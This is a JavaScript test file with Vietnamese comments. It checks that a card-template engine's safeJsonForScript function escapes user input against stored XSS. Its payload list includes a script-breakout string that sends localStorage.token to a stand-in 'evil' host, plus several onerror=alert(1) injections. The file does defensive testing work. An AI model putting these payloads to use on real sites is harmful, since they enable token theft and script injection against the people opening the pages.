// Test cho lớp bơm dữ liệu vào mẫu thiệp (chạy: node --test test/)
import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'fs'

const SRC = readFileSync(new URL('../src/lib/templateEngine.js', import.meta.url), 'utf8')

// Lấy đúng hàm đang chạy trong mã nguồn thật, không chép lại -> test không bị lệch
// khi ai đó sửa hàm mà quên sửa test.
const extract = (name) => {
  const start = SRC.indexOf(`const ${name}`)
  assert.ok(start >= 0, `không tìm thấy hàm ${name}`)
  const end = SRC.indexOf('\n\n', start)
  return new Function(SRC.slice(start, end) + `; return ${name};`)()
}

const safeJsonForScript = extract('safeJsonForScript')

test('chặn thoát thẻ script từ dữ liệu người dùng nhập (XSS lưu trữ)', () => {
  // Đây là lỗ hổng thật đã vá: JSON.stringify không escape "<", nên tiêu đề thiệp
  // chứa "</script>" sẽ đóng sớm thẻ script và chạy mã của kẻ tấn công trong iframe
  // — nơi có quyền đọc localStorage.token của người đang mở thiệp.
  const payloads = [
    '</script><script>fetch("//evil/"+localStorage.token)</script>',
    '</SCRIPT ><img src=x onerror=alert(1)>',
    '<!--<script>',
    '<img src=x onerror=alert(1)>',
    ' alert(1)',
    ' alert(1)',
  ]
  for (const p of payloads) {
    const out = safeJsonForScript({ title_vi: p })
    assert.ok(!out.includes('<'), `còn ký tự < trong: ${p}`)
    assert.ok(!out.includes('>'), `còn ký tự > trong: ${p}`)
    assert.ok(!out.includes(' '), 'còn U+2028')
    assert.ok(!out.includes(' '), 'còn U+2029')
  }
})

test('escape xong dữ liệu vẫn nguyên vẹn khi trình duyệt giải mã', () => {
  // Escape mà làm hỏng chữ hiển thị thì tiêu đề thiệp sẽ hiện sai.
  const original = {
    title_vi: 'Tiệc cưới A & B <3 — 100% hạnh phúc',
    thank_you_message: '</script> cảm ơn quý khách',
    nested: { note: 'a < b > c & d' },
  }
  assert.deepEqual(JSON.parse(safeJsonForScript(original)), original)
})

test('tiếng Việt có dấu không bị escape sai', () => {
  const vn = { name: 'Nguyễn Thị Ánh Nguyệt', addr: 'Phường Đằng Hải, Quận Hải An' }
  assert.deepEqual(JSON.parse(safeJsonForScript(vn)), vn)
})
